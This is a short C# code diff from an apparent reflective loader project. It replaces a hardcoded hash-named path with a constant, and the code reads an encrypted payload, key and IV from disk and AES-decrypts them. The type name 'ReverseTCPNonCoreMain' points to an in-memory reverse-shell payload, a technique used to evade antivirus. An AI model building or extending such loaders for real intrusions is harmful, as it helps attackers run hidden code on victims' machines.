@@ -10,14 +10,16 @@ namespace ReflectiveLoader
     internal class ReflectiveLoaderMain
     {
         static String TYPENAME = "ReflectiveLoader.ReverseTCPNonCoreMain"; // TODO: define config file?
+        static String ENCRPATH = "f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3"; // TODO: also put in config file
+
         static BindingFlags FLAGS_ALL_STATIC = BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public;
 
         static void Main()
         {
             // TODO: define config file?
-            byte[] bytesEncr = File.ReadAllBytes("f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3");
-            byte[] key = File.ReadAllBytes("f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3.key");
-            byte[] IV = File.ReadAllBytes("f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3.IV");
+            byte[] bytesEncr = File.ReadAllBytes(ENCRPATH);
+            byte[] key = File.ReadAllBytes(ENCRPATH + ".key");
+            byte[] IV = File.ReadAllBytes(ENCRPATH + ".IV");
 
             byte[] bytesPlain = BinaryEncryptor.DecryptAes(bytesEncr, key, IV);
 
